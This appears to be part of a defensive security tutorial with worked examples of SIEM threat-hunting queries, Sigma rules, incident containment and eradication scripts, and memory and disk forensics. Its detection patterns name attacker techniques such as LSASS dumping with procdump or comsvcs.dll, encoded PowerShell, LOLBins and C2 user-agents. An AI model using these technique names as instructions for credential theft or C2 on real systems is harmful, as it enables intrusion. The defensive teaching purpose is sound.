## Example 44: Detecting Data Exfiltration — Large Outbound Transfers to a New External IP

**What this covers:** Data exfiltration over common protocols (HTTPS, FTP, SMB) shows up as unusually large outbound byte transfers to external IPs that have not been seen before in the environment's network baseline. Comparing current transfer volumes against a 30-day rolling baseline and flagging new destination IPs together creates a high-signal detection with reduced false positives from known cloud service IP ranges.

**Scenario:** During an incident investigation, the IR team queries NetFlow data and discovers a server transferred 4.2 GB to a previously unseen IP in Romania over a 90-minute window via port 443.

```splunk
index=network_flows direction="outbound"
  dest_port IN (443,80,21,22,445,8443)
| stats sum(bytes_out) as total_bytes_out by src_ip, dest_ip, dest_port, _time span=1h
  # => sum outbound bytes per flow tuple per hour
| eval gb_out=round(total_bytes_out/1073741824, 2)
  # => convert bytes to GB for human-readable triage
| where gb_out > 0.5
  # => 500 MB/hr threshold; tune based on environment's normal transfer patterns
| lookup historical_connections ip as dest_ip OUTPUT first_seen_date
  # => enrichment: when was this destination IP first seen in your environment?
| eval is_new_dest=if(isnull(first_seen_date) OR relative_time(now(),"-30d") > strptime(first_seen_date,"%Y-%m-%d"), "yes","no")
  # => "new" = not seen in the last 30 days; new destinations are higher risk
| lookup geoip dest_ip OUTPUT country_name, asn_org
  # => geolocation and ASN help identify unexpected destination countries
  # => flag transfers to hosting ASNs (OVH, Hetzner, Vultr) — common attacker infrastructure
| lookup cloud_ip_ranges ip as dest_ip OUTPUT cloud_provider
  # => exclude known cloud services (AWS, Azure, GCP, Cloudflare) to reduce noise
| where isnull(cloud_provider) AND is_new_dest="yes"
  # => focus on non-cloud new destinations; most cloud uploads are legitimate
| sort - gb_out
  # => largest transfers first for triage priority
```

**Key Takeaway:** Large outbound transfers to IP addresses not previously observed in a 30-day baseline, filtered against known cloud provider ranges, are high-fidelity exfiltration indicators requiring immediate investigation.

**Why It Matters:** Data exfiltration is the final phase of most financially motivated intrusions and state-sponsored espionage, and detecting it before the transfer completes can prevent the worst business outcomes. Volume-based detection is effective because staging and exfiltrating large datasets (intellectual property, customer data, financial records) creates a statistically anomalous spike that is difficult for attackers to disguise without sacrificing transfer speed. Combining with DLP tools and cloud access monitoring provides defense in depth.

---

## Example 45: Splunk Threat Hunting — Rare Process Parent-Child Relationships

**What this covers:** Threat hunting for unusual parent-child process relationships identifies attacker techniques that spawn processes from unexpected parents — for example, `Word.exe` launching `PowerShell.exe` (macro execution), or `explorer.exe` launching `regsvr32.exe` (LOLBin persistence). Calculating the frequency of each parent-child pair across your environment over 30 days surfaces pairs that have occurred fewer than 5 times — "rare" relationships worth investigating.

**Scenario:** A threat hunter builds a frequency analysis query to find the rarest process parent-child relationships observed in the last 30 days, then reviews them for attacker-relevant techniques.

```splunk
index=wineventlog EventCode=4688 earliest=-30d
  # => 30-day historical window gives a statistically meaningful baseline
| eval parent=lower(mvindex(split(ParentProcessName,"\\"),-1))
  # => extract just the binary name from the full parent path (case-normalized)
| eval child=lower(mvindex(split(NewProcessName,"\\"),-1))
  # => extract just the binary name from the full child path
| where parent != child
  # => exclude self-spawning (normal for some processes like svchost)
| stats count by parent, child
  # => count occurrences of each unique parent→child relationship
  # => common pairs: svchost→cmd (~10,000), explorer→chrome (~50,000)
  # => rare pairs: winword→powershell (2-3), msiexec→regsvr32 (1)
| where count < 5
  # => "rare" threshold: any pair seen fewer than 5 times in 30 days
  # => adjust based on environment size (larger orgs need higher threshold)
| eval attacker_relevant=case(
    match(child,"(?i)powershell|cmd|wscript|mshta|regsvr32|certutil"),"Interpreter/LOLBin",
    match(parent,"(?i)winword|excel|outlook|powerpnt"),"Office macro spawn",
    match(parent,"(?i)browser|chrome|firefox|iexplore"),"Browser spawn",
    true(),"Other rare")
  # => categorize pairs by attacker technique relevance
| sort - attacker_relevant, count
  # => attacker-relevant rare pairs = top priority for follow-up investigation
```

**Key Takeaway:** Rare parent-child process relationships — particularly Office applications spawning interpreters or browsers spawning system utilities — represent the behavioral fingerprint of exploitation and living-off-the-land techniques that evade signature-based detection.

**Why It Matters:** Frequency analysis-based hunting is one of the most effective techniques for discovering novel malware and hands-on-keyboard attacker activity that has no known signature. The approach is environment-agnostic and improves over time as the baseline grows. It works precisely because attackers must execute code, and code execution always leaves a parent-child relationship in the process tree — the only variable is whether that relationship is common enough to hide in noise.

---

## Example 46: Elastic Threat Hunting — Rare User-Agent Strings in Web Logs

**What this covers:** C2 frameworks, web shells, and attacker tooling often use hardcoded or unusual HTTP User-Agent strings that do not match any real browser or common library. Elastic's EQL (Event Query Language) or standard KQL can frequency-rank User-Agents across web proxy or IIS logs to surface strings seen in fewer than 0.1% of requests — a practical hunt for attacker tooling communicating over HTTP(S).

**Scenario:** A threat hunter uses Elastic to baseline User-Agent frequency across 60 days of web proxy logs, then investigates the bottom 0.5% of agents that appear in fewer than 50 requests and do not match any known browser pattern.

```kql
index: "web-proxy-*"
fields: @timestamp, src_ip, dest_url, http.request.user_agent, http.response.status_code
filter:
  - range:
      @timestamp:
        gte: "now-60d"
        # => 60-day window provides a statistically robust frequency baseline
  - exists:
      field: http.request.user_agent
      # => exclude events with no User-Agent header (some automated tools omit it)
aggregations:
  user_agent_count:
    terms:
      field: http.request.user_agent.keyword
      size: 10000
      # => retrieve the 10,000 most common User-Agents for frequency analysis
      order:
        _count: asc
        # => ascending order puts the rarest agents first
    aggs:
      sample_ips:
        terms:
          field: src_ip
          size: 5
          # => show up to 5 source IPs using each rare agent
      sample_urls:
        terms:
          field: dest_url
          size: 5
          # => show destination URLs accessed with this agent
post_filter:
  # => in follow-up query, filter to agents with count < 50 AND not matching known browsers
  # => known browser pattern: Mozilla, Chrome, Safari, Firefox, Edge, curl, python-requests
  # => attacker examples: "Mozilla/4.0 (compatible)", "Go-http-client/1.1", "Cobalt Strike"
```

**Key Takeaway:** User-Agent strings appearing in fewer than 50 requests over 60 days that do not match any known browser or common library are high-value hunting leads for C2 beaconing and attacker tooling.

**Why It Matters:** Many C2 frameworks ship with default User-Agent strings that are either obviously fake, heavily reused across campaigns, or belong to outdated browser versions no longer present in the environment. Rare-agent hunting catches both commodity tooling (Metasploit, Havoc) and custom implants where the operator forgot to configure a convincing User-Agent. This hunt complements IP reputation and domain categorization checks by catching threats that use legitimate hosting infrastructure or domain fronting.

---

## Example 47: Building a Detection Hypothesis — MITRE ATT&CK T1003 (LSASS Dump) Hunt

**What this covers:** A detection hypothesis formalizes the attacker behavior you intend to detect, the data sources required, and the specific observables you will look for. Building a hypothesis before writing a query ensures the detection has clear scope, measurable success criteria, and is grounded in the ATT&CK framework technique being hunted.

**Scenario:** A threat hunt team lead is asked to build a new detection for LSASS credential dumping ahead of a red team exercise. They document the hypothesis before querying any data.

```yaml
# Detection Hypothesis — MITRE ATT&CK T1003.001: LSASS Memory Dumping
# -----------------------------------------------------------------------
hypothesis:
  technique: "T1003.001 - OS Credential Dumping: LSASS Memory"
  # => MITRE ATT&CK technique ID and sub-technique for tracking and coverage mapping

  attacker_goal: >
    Attacker reads lsass.exe memory to extract plaintext passwords,
    NTLM hashes, or Kerberos tickets for lateral movement or privilege escalation.
    # => defining the goal ensures the detection targets the right behavioral step

  assumption: >
    Attacker has SYSTEM or SeDebugPrivilege on the target host.
    # => precondition — detection may miss cases where these privileges are obtained differently

data_sources:
  primary:
    - "Sysmon Event ID 10 (ProcessAccess on lsass.exe)"
    # => most reliable: records process handle open with specific access rights
  secondary:
    - "Windows Event ID 4656 (object access)"
    - "EDR telemetry (process memory read alerts)"
    - "Windows Event ID 4688 + 4689 (process creation/termination of dump tools)"
    # => secondary sources provide corroboration and catch technique variants

observables:
  high_confidence:
    - "SourceImage NOT IN known-good allowlist AND GrantedAccess IN [0x1010,0x1410,0x143a,0x1fffff]"
    # => specific access right masks that include PROCESS_VM_READ
  medium_confidence:
    - "procdump.exe -ma lsass.exe OR comsvcs.dll MiniDump in CommandLine"
    # => named tool signatures; attackers rename tools to evade these
  low_confidence:
    - "Any process open on lsass.exe not from SYSTEM"
    # => catches novel techniques but high false-positive rate from AV/EDR

false_positive_profile:
  - "EDR agents (CrowdStrike, SentinelOne, Carbon Black) — allowlist by path + signature"
  - "Windows Error Reporting (WerFault.exe) — allowlist specific access mask"
  - "Antivirus scanners — allowlist by signer certificate"
  # => documenting expected false positives reduces analyst fatigue and supports tuning

success_criteria:
  - "Alert fires within 60 seconds of lsass dump on test host"
  - "False positive rate < 2 per day in production"
  # => measurable outcomes allow evaluation after deployment
```

**Key Takeaway:** A written detection hypothesis — covering technique, data sources, observables, false positive profile, and success criteria — transforms ad-hoc hunting into a repeatable, measurable, and peer-reviewable engineering practice.

**Why It Matters:** Detections built without a hypothesis are often poorly scoped, generate excessive false positives, or miss key variants of the target technique. Formalizing hypotheses as YAML or structured documents enables detection-as-code workflows, version control, ATT&CK coverage mapping, and tabletop exercises where the red team can validate coverage before production deployment. It also provides clear acceptance criteria for QA.

---

## Example 48: Writing a Sigma Rule for LSASS Access — Sysmon Event ID 10 Detection

**What this covers:** Sigma is a generic, vendor-neutral detection rule format that can be compiled to Splunk SPL, Elastic ESQL, Microsoft Sentinel KQL, and other SIEM query languages. A Sigma rule for LSASS access defines the log source, detection fields, conditions, and metadata, and is shareable across security teams and public repositories without revealing implementation-specific SIEM details.

**Scenario:** A detection engineer writes a Sigma rule to detect LSASS credential dumping via Sysmon Event ID 10, then compiles it for deployment in both Splunk and Elastic.

```yaml
# File: rules/windows/credential_access/lsass_memory_dump_sysmon.yml
title: LSASS Memory Access by Suspicious Process
# => human-readable title for analyst consumption and documentation

id: 7b9e2f4a-3d1c-4e8b-a562-f0d1e3c4b789
# => UUID v4 unique identifier; never reuse across rules; used for deduplication in SIEM

status: experimental
# => lifecycle: test -> experimental -> stable; experimental means under active tuning

description: |
  Detects suspicious process access to lsass.exe with memory-read access rights,
  indicating potential credential dumping via tools such as Mimikatz, ProcDump,
  or comsvcs.dll MiniDump technique.
  # => description feeds SOAR playbooks and analyst guidance dashboards

references:
  - https://attack.mitre.org/techniques/T1003/001/
  - https://github.com/gentilkiwi/mimikatz
  # => traceability to ATT&CK and tool documentation

author: "SOC Detection Engineering Team"
date: 2026/05/21
modified: 2026/05/21
tags:
  - attack.credential_access # => MITRE tactic
  - attack.t1003.001 # => MITRE technique
  - attack.s0002 # => MITRE software reference for Mimikatz

logsource:
  category: process_access # => Sigma category that maps to Sysmon Event ID 10
  product: windows
  # => Sigma's sigmac/pySigma resolves this to the correct field names per backend

detection:
  selection_target:
    TargetImage|endswith: '\lsass.exe'
    # => match only accesses to lsass.exe as the target
  selection_access:
    GrantedAccess|contains:
      - "0x1010" # => PROCESS_VM_READ + PROCESS_QUERY_INFO (Mimikatz classic)
      - "0x1410" # => extended read access
      - "0x143a" # => near-full access (ProcDump full dump)
      - "0x1fffff" # => PROCESS_ALL_ACCESS (very aggressive; rare legit)
      - "0x40" # => PROCESS_DUP_HANDLE used in some evasion techniques
  filter_legitimate:
    SourceImage|startswith:
      - 'C:\Program Files\CrowdStrike\' # => EDR agent
      - 'C:\Program Files\SentinelOne\' # => EDR agent
      - 'C:\Windows\System32\werfault.exe' # => Windows Error Reporting
  condition: (selection_target AND selection_access) AND NOT filter_legitimate
  # => require both target and access conditions; exclude known-good sources

falsepositives:
  - AV/EDR agents not in the filter list — add to filter_legitimate
  - Windows Defender Credential Guard inspection processes

level: high
# => severity: informational/low/medium/high/critical; high triggers immediate triage
```

**Key Takeaway:** A well-structured Sigma rule with explicit filter conditions, ATT&CK tags, and lifecycle status is portable across SIEM platforms and serves as living documentation of the detection logic.

**Why It Matters:** Sigma enables detection sharing across organizations, security vendors, and open-source communities (SigmaHQ) without revealing proprietary SIEM configurations. A single Sigma rule maintained by the detection team compiles to Splunk, Elastic, Chronicle, and Sentinel simultaneously, reducing the maintenance burden of managing platform-specific rules. The standardized metadata — ATT&CK tags, severity, false positive profile — integrates directly into detection-as-code pipelines and threat intelligence platforms.

---

## Example 49: Writing a Sigma Rule for Encoded PowerShell — CommandLine Contains -EncodedCommand

**What this covers:** Attackers encode PowerShell payloads in base64 using the `-EncodedCommand` (or `-enc`) flag to bypass simple string-matching defenses and hide the command's intent from casual log review. Sigma detects this by matching the `-EncodedCommand` flag in process creation logs, with additional conditions for suspicious parent processes or unusual execution paths that distinguish attacker use from legitimate administrative automation.

**Scenario:** A detection engineer adds encoded PowerShell detection to the team's Sigma rule library after multiple incidents involved base64-encoded stagers.

```yaml
title: Encoded PowerShell Command Execution
id: a3c7e912-4f5b-4d2a-b891-e0f3c2d1a4b6
status: stable
# => stable = well-tuned with documented false positive profile

description: |
  Detects PowerShell processes launched with the -EncodedCommand parameter,
  which is used to execute base64-encoded payloads and is a common technique
  to obfuscate malicious scripts from log inspection.

author: "SOC Detection Engineering Team"
date: 2026/05/21
tags:
  - attack.execution # => MITRE tactic: Execution
  - attack.defense_evasion # => MITRE tactic: Defense Evasion
  - attack.t1059.001 # => PowerShell technique
  - attack.t1027 # => Obfuscated Files or Information

logsource:
  category: process_creation # => Sysmon Event ID 1 OR Windows Event 4688 with command-line
  product: windows

detection:
  selection_encoded:
    CommandLine|contains:
      - " -EncodedCommand " # => full flag name with surrounding spaces
      - " -enc " # => abbreviated flag (most common in attacker tooling)
      - " -EC " # => uppercase variant
      # => PowerShell parameter parsing is case-insensitive; all variants are valid
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe' # => PowerShell 7 binary name
  filter_admin_tools:
    ParentImage|startswith:
      - 'C:\Program Files\ManageEngine\' # => RMM/admin tool with known encoded PS usage
      - 'C:\Program Files\SCCM\' # => SCCM client management
  filter_short_encoded:
    CommandLine|re: "(?i)-e[nc]+ [A-Za-z0-9+/]{0,20}={0,2}$"
    # => very short base64 strings (<20 chars) are often legitimate version checks
    # => long encoded commands are always suspicious

  condition: selection_encoded AND NOT (filter_admin_tools OR filter_short_encoded)
  # => detection fires when encoded PS is used outside known admin tools and not trivially short

falsepositives:
  - Legitimate RMM/management tools using encoded commands for configuration
  - SCCM/Intune deployment scripts — add parent process to filter_admin_tools
  - Scheduled tasks running encoded PS for maintenance — review and allowlist by task name

level: medium
# => medium because encoded PS has many legitimate uses; context (parent, path, payload) elevates
```

**Key Takeaway:** Matching `-EncodedCommand` in PowerShell process creation events with appropriate parent-process filters provides broad coverage of obfuscated PowerShell execution while maintaining a manageable false positive rate.

**Why It Matters:** Base64-encoded PowerShell is present in virtually every modern intrusion chain — from phishing macro stagers to fileless ransomware loaders — because it trivially bypasses AMSI in unpatched environments and makes log review harder for first responders. The Sigma rule format allows the detection team to encode environment-specific allowlists as filter conditions, keeping the base rule portable while allowing local tuning. Combining this detection with PowerShell script block logging (Event ID 4104) provides the decoded payload for forensic analysis.

---

## Example 50: Microsoft Sentinel KQL — Detecting Impossible Travel

**What this covers:** Impossible travel detects when a user account authenticates from two geographically distant locations within a time window too short for physical travel. The technique correlates successive authentication events by the same user, calculates the distance between source countries, and flags pairs where travel would require implausible speed (>900 km/h). This catches credential compromise where an attacker in one country uses stolen credentials while the legitimate user is elsewhere.

**Scenario:** A Sentinel alert engineer builds an impossible travel detection rule using Azure AD sign-in logs to flag accounts that authenticate from two countries more than 3,000 km apart within four hours.

```kql
// Impossible Travel Detection — Azure AD Sign-In Logs
// -------------------------------------------------------
SigninLogs
| where TimeGenerated > ago(24h)
  // look back 24 hours; adjust to 7d for lower-frequency accounts
| where ResultType == 0
  // ResultType 0 = successful authentication; failed logins are not impossible travel
| project TimeGenerated, UserPrincipalName, IPAddress, Location, CountryOrRegion
  // project only needed fields to reduce query cost
| sort by UserPrincipalName asc, TimeGenerated asc
  // sort by user then time to prepare for lag calculation
| serialize
  // required before using prev() function in streaming window calculations
| extend prev_time = prev(TimeGenerated, 1)
  // capture timestamp of the immediately preceding sign-in for this user
| extend prev_country = prev(CountryOrRegion, 1)
  // capture country of the preceding sign-in
| extend prev_user = prev(UserPrincipalName, 1)
| where UserPrincipalName == prev_user
  // only compare events for the same user account
| extend hours_between = datetime_diff('hour', TimeGenerated, prev_time)
  // hours elapsed between the two authentications
| where hours_between between (0 .. 4)
  // 4-hour window: most impossible travel occurs within this window
  // wider windows increase false positives from VPN users
| where CountryOrRegion != prev_country
  // different countries is the base condition
| where isnotempty(CountryOrRegion) and isnotempty(prev_country)
  // exclude events where geolocation data is missing
| where CountryOrRegion !in ("Unknown") and prev_country !in ("Unknown")
| project TimeGenerated, UserPrincipalName, IPAddress,
          CurrentCountry = CountryOrRegion, PreviousCountry = prev_country,
          hours_between
  // surface actionable columns for analyst triage
| where not (CurrentCountry == "United States" and prev_country == "Canada")
  // example allowlist: US/Canada is plausible for border workers; tune per environment
| order by hours_between asc
  // shortest time gaps first = most implausible travel = highest priority
```

**Key Takeaway:** Sentinel's `prev()` streaming function enables efficient successive event comparison without self-joins, making impossible travel detection practical at scale across large Azure AD sign-in log volumes.

**Why It Matters:** Impossible travel is one of the most reliable signals of account compromise from stolen credentials sold on criminal markets, because legitimate users cannot physically be in two countries simultaneously. This detection catches both bulk credential stuffing attacks and targeted account takeover, and is particularly valuable for cloud environments where authentication is geographically unrestricted. The primary tuning challenge is VPN usage — users who authenticate through VPN exit nodes in different countries will generate false positives that require allowlisting by VPN IP ranges.

---

## Example 51: Microsoft Sentinel KQL — Alerting on New Admin Account Creation

**What this covers:** Unauthorized privileged account creation is a persistence and privilege escalation technique used by attackers who have gained sufficient access to create accounts. Azure AD Audit Logs record every directory role assignment; Sentinel can alert in near-real-time when any account is added to a privileged role (Global Administrator, User Administrator, Security Administrator) outside a known change window or by an unexpected actor.

**Scenario:** A Sentinel analytics rule fires when any account is added to the Global Administrator role by a user account rather than a service principal during a provisioning workflow.

```kql
// New Privileged Role Assignment Detection — Azure AD Audit Logs
// ---------------------------------------------------------------
AuditLogs
| where TimeGenerated > ago(1h)
  // 1-hour lookback for near-real-time alerting; schedule rule to run every 15 min
| where OperationName == "Add member to role"
  // specific operation for role membership addition
| where Result == "success"
  // only alert on successful assignments; failed attempts are tracked separately
| extend TargetRole = tostring(TargetResources[0].displayName)
  // extract the role name from the nested TargetResources array
| extend TargetUser = tostring(TargetResources[0].userPrincipalName)
  // the account that was granted the role
| extend InitiatedBy_UPN = tostring(InitiatedBy.user.userPrincipalName)
  // who performed the assignment — should be a known identity management account
| extend InitiatedBy_App = tostring(InitiatedBy.app.displayName)
  // if initiated by an app/service principal, capture that name
| where TargetRole in (
    "Global Administrator",
    "User Administrator",
    "Security Administrator",
    "Privileged Role Administrator",
    "Exchange Administrator"
    // => add all high-privilege roles relevant to your M365 environment
  )
| where isempty(InitiatedBy_App)
  // flag human-initiated assignments; service principals running provisioning workflows are expected
  // remove this line if your environment has no automated provisioning
| where InitiatedBy_UPN !in ("provisioning-svc@contoso.com", "idm-admin@contoso.com")
  // allowlist known authorized identity management accounts
  // => tune to your environment's provisioning account UPNs
| project TimeGenerated, TargetRole, TargetUser, InitiatedBy_UPN,
          InitiatedBy_App, CorrelationId
  // CorrelationId links to the full authentication context in SigninLogs
| order by TimeGenerated desc
```

**Key Takeaway:** Near-real-time alerting on privileged role assignments filtered to human-initiated actions by non-provisioning accounts catches unauthorized backdoor admin account creation with minimal false positives.

**Why It Matters:** Admin account creation is the most reliable persistence technique in cloud environments because privileged accounts survive password resets of the compromised initial access account, are not visible in on-premises user inventories, and can maintain access even if the original compromise vector is remediated. Detecting this within minutes of the assignment — rather than during a weekly access review — is the difference between catching an attacker establishing persistence and discovering a months-old backdoor during a breach investigation.

---

## Example 52: Incident Containment — Isolating a Compromised Host with Firewall Rules

**What this covers:** Host isolation is the first containment action after confirming a compromise — it cuts off attacker C2 access and prevents lateral movement while preserving evidence on the system. This example shows the bash and PowerShell commands used to isolate a Linux or Windows host using host-based firewall rules, preserving only management access for the IR team.

**Scenario:** An IR analyst confirms a Linux web server is running a reverse shell beacon to `185.220.101.42:4444`. They isolate it using iptables while maintaining SSH access from the IR jump box `192.0.2.5`.

```bash
# ============================================================
# LINUX HOST ISOLATION — iptables-based containment
# Run as root on the compromised host or via remote management
# ============================================================

# Step 1: Flush all existing rules (start clean)
iptables -F INPUT
iptables -F OUTPUT
iptables -F FORWARD
# => removes any existing rules that might conflict with isolation rules
# => CAUTION: this temporarily drops all firewall protection during the transition

# Step 2: Allow established/related connections to prevent session drops
iptables -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# => prevents dropping the current SSH session we're using for containment

# Step 3: Allow SSH from IR jump box ONLY
iptables -A INPUT  -s 192.0.2.5 -p tcp --dport 22 -j ACCEPT
# => 192.0.2.5 = IR jump box; substitute your actual IR management IP
iptables -A OUTPUT -d 192.0.2.5 -p tcp --sport 22 -j ACCEPT

# Step 4: Allow DNS to internal resolver (needed for some investigation tools)
iptables -A OUTPUT -d 198.51.100.53 -p udp --dport 53 -j ACCEPT
# => substitute your internal DNS resolver IP

# Step 5: Block ALL other inbound and outbound traffic
iptables -P INPUT  DROP
# => default policy: drop everything not explicitly allowed
iptables -P OUTPUT DROP
# => this cuts off the attacker's reverse shell and C2 callback
iptables -P FORWARD DROP

# Step 6: Save rules so they survive a service restart (not reboot)
iptables-save > /etc/iptables/rules.v4
# => persists rules; on Ubuntu use: netfilter-persistent save

# Verification: confirm C2 destination is now blocked
iptables -L -n -v | grep "185.220.101.42"
# => should show no ACCEPT rule for the attacker IP
# => test with: curl --connect-timeout 5 http://185.220.101.42:4444 — should time out
```

**Key Takeaway:** iptables-based isolation that explicitly allows only IR management access and blocks all other traffic provides containment without requiring network infrastructure changes or taking the host fully offline.

**Why It Matters:** Host isolation must balance containment with evidence preservation — taking a system fully offline destroys volatile memory (running processes, network connections, open files) that is critical for forensics. A firewall-based isolation preserves the system state while denying the attacker operational access. IR teams should have isolation playbooks prepared in advance, tested, and scripted so containment actions take minutes, not hours. Automated isolation triggered by EDR detections reduces dwell time further.

---

## Example 53: Incident Eradication — Removing Persistence Mechanisms Checklist and Commands

**What this covers:** Eradication removes all attacker footholds from a compromised system before it returns to production. This example provides an ordered checklist of persistence mechanisms to audit and remove, with the specific commands to identify and eliminate each one on a Windows host.

**Scenario:** Following containment, an IR engineer performs systematic eradication on a compromised Windows 10 host where the attacker used multiple persistence mechanisms over a three-week dwell period.

```bash
# ============================================================
# WINDOWS ERADICATION CHECKLIST
# Run in PowerShell as Administrator on the compromised host
# Document every finding and removal action in the IR report
# ============================================================

# 1. Enumerate and audit scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} |
  Select-Object TaskName, TaskPath, @{n='Command';e={$_.Actions.Execute}} |
  Export-Csv C:\IR\scheduled_tasks.csv
# => exports all enabled tasks; review for unknown task names or suspicious commands
# => remove confirmed malicious task: Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false

# 2. Enumerate registry Run keys
$runkeys = @(
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
  "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
  "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($key in $runkeys) {
  Write-Output "=== $key ==="; Get-ItemProperty $key
  # => lists all values; identify and remove attacker entries
}
# => remove entry: Remove-ItemProperty -Path "HKCU:\...\Run" -Name "MaliciousEntry"

# 3. Enumerate WMI event subscriptions
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query
# => lists all WMI event filters; legitimate filters are few and well-known
Get-WMIObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name
# => lists all consumers; attacker-created consumers have unusual names
# => remove: Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='BVUpdater'" | Remove-WMIObject

# 4. Enumerate installed services
Get-Service | Where-Object {$_.StartType -ne "Disabled"} |
  Select-Object Name, DisplayName, StartType, BinaryPathName |
  Sort-Object StartType
# => look for services with executables in non-standard paths (Temp, AppData, Users)
# => remove: sc.exe delete "MaliciousService"

# 5. Remove attacker-created user accounts
Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object Name, LastLogon
# => compare against approved user list; remove unknown accounts
# => Remove-LocalUser -Name "backdoor_user"

# 6. Reset compromised account passwords
# => All accounts that logged into this host during the intrusion period should be reset
# => Get-EventLog -LogName Security -InstanceId 4624 -After (Get-Date).AddDays(-30) |
#    Where-Object {$_.Message -match "LogonType:\s+3"} | Select-Object Message
```

**Key Takeaway:** Eradication requires systematic enumeration of all persistence mechanisms — scheduled tasks, registry run keys, WMI subscriptions, services, and accounts — with documented removal of each finding before declaring the host clean.

**Why It Matters:** Incomplete eradication is the most common reason for re-compromise after an incident. Attackers often establish three or four independent persistence mechanisms, expecting that IR teams will find and remove the obvious ones while missing the stealthy WMI subscription or the service registered with a convincing-sounding name. A structured checklist ensures no mechanism is overlooked. All eradication actions must be documented for the IR report and for evidence chain-of-custody purposes.

---

## Example 54: Memory Forensics Triage — volatility3 pstree and netscan on a Memory Dump

**What this covers:** Memory forensics extracts evidence from a RAM dump that is not present on disk — running malware processes, network connections, injected code, and decrypted credentials. `volatility3` is the standard open-source framework; `pstree` reveals the process tree (parent-child relationships, process IDs) and `netscan` shows active and recently closed network connections at the time of capture.

**Scenario:** An IR analyst captures memory from a suspected implant host using WinPmem and runs initial triage with volatility3 to identify suspicious processes and active C2 connections.

```bash
# ============================================================
# MEMORY FORENSICS TRIAGE — volatility3
# Prerequisite: pip install volatility3
# Memory image: /evidence/host01_20260521.raw
# ============================================================

# Step 1: Identify the OS profile (volatility3 autodetects)
python3 vol.py -f /evidence/host01_20260521.raw windows.info
# => outputs Windows version, kernel version, and architecture
# => confirms the correct symbol table will be used for parsing

# Step 2: Process tree — find orphan/injected processes
python3 vol.py -f /evidence/host01_20260521.raw windows.pstree.PsTree \
  | tee /evidence/pstree.txt
# => output columns: PID, PPID, ImageFileName, Offset, Threads, Handles, SessionId
# => review for:
#    - processes with PPID pointing to non-existent process (orphan = process hollowing)
#    - svchost.exe with unexpected PPID (should be services.exe, PID typically ~660)
#    - cmd.exe or powershell.exe spawned by unusual parents (see Example 35)

# Step 3: Network scan — find active and closed connections
python3 vol.py -f /evidence/host01_20260521.raw windows.netscan.NetScan \
  | tee /evidence/netscan.txt
# => output columns: Offset, Proto, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner
# => review for:
#    - ESTABLISHED connections to external IPs from unusual processes
#    - CLOSE_WAIT connections (recently closed C2 channels)
#    - processes listening on non-standard ports (backdoor listeners)

grep -i "ESTABLISHED" /evidence/netscan.txt | grep -v "127.0.0.1\|::1"
# => filter to active outbound connections, excluding loopback
# => example suspicious output:
#    TCPv4  192.0.2.45:52341  185.220.101.42:443  ESTABLISHED  3948  rundll32.exe
#    => rundll32.exe with external ESTABLISHED connection = highly suspicious

# Step 4: Dump suspicious process for static analysis
python3 vol.py -f /evidence/host01_20260521.raw windows.dumpfiles.DumpFiles \
  --pid 3948 --dump-dir /evidence/dumps/
# => dumps all memory-mapped files for PID 3948 (the suspicious rundll32.exe)
# => submit dumped .exe/.dll to sandboxes or run YARA against them
```

**Key Takeaway:** `pstree` reveals orphaned or mis-parented processes indicative of process injection or hollowing, while `netscan` surfaces active C2 connections that may not appear in host-based firewall logs because they use legitimate process handles.

**Why It Matters:** Memory forensics provides evidence that attackers cannot easily destroy — even after rebooting or deleting malware files, process injection artifacts, decrypted payloads, and network connection state exist in RAM only during execution. Capturing memory before rebooting a compromised host preserves this evidence and often yields the only forensically sound copy of a fileless malware payload. The volatility3 plugin ecosystem also supports credential extraction, registry analysis, and YARA scanning against in-memory content.

---

## Example 55: Disk Forensics Basics — Autopsy Timeline Analysis of Suspicious File Activity

**What this covers:** Disk forensics reconstructs attacker activity from filesystem artifacts: file creation timestamps, modification times, access times, and deleted file remnants. Autopsy's timeline analysis mode correlates these timestamps across all files to produce a chronological view of attacker activity. This example shows how to use Autopsy's command-line interface (or interpret its output) to identify the attacker's activity window and dropped files.

**Scenario:** An IR analyst examines a forensic image of a compromised server's C: drive, using Autopsy's timeline to find all files created or modified during a 48-hour suspected intrusion window.

```bash
# ============================================================
# DISK FORENSICS TRIAGE — Autopsy CLI / plaso-based timeline
# Alternative to Autopsy GUI: use log2timeline + psort
# ============================================================

# Step 1: Generate a supertimeline with log2timeline (plaso)
log2timeline.py \
  --storage-file /evidence/timeline.plaso \
  /evidence/host01_disk.dd
# => processes all forensic artifacts: MFT, registry, event logs, browser history, prefetch
# => --storage-file stores the intermediate Plaso storage file for multiple analysis passes
# => this step may take 30-90 minutes depending on image size

# Step 2: Export timeline to CSV for analysis
psort.py \
  --output-time-zone "Asia/Jakarta" \
  --output-format dynamic \
  --write /evidence/timeline.csv \
  /evidence/timeline.plaso
# => output-time-zone converts all timestamps to local analyst timezone
# => dynamic format includes all available fields per event type

# Step 3: Filter to suspicious activity window (2026-05-19 02:00 to 2026-05-21 06:00)
grep "2026-05-19\|2026-05-20\|2026-05-21" /evidence/timeline.csv \
  | grep -i "MTIME\|CTIME\|ATIME\|CRTIME" \
  | grep -i "\\\.exe\|\.dll\|\.ps1\|\.bat\|\.vbs\|\.php" \
  | grep -i "temp\|appdata\|public\|downloads" \
  > /evidence/suspicious_files_window.txt
# => MTIME = last modification time (content change)
# => CTIME = metadata change time (attribute change, often used for timestamp analysis)
# => CRTIME = creation time (when file was first written)
# => filter to executable extensions in user-writable paths = attacker staging areas

# Step 4: Recover deleted files with photorec or tsk_recover
tsk_recover -e /evidence/host01_disk.dd /evidence/recovered_files/
# => -e = recover all files including deleted ones
# => attacker-deleted malware samples are often recoverable from unallocated space
# => recovered files lack original filenames; use file magic to identify type

# Step 5: Calculate hashes of suspicious files for TI lookup
find /evidence/suspicious_files_window_files/ -type f \
  | xargs sha256sum > /evidence/file_hashes.txt
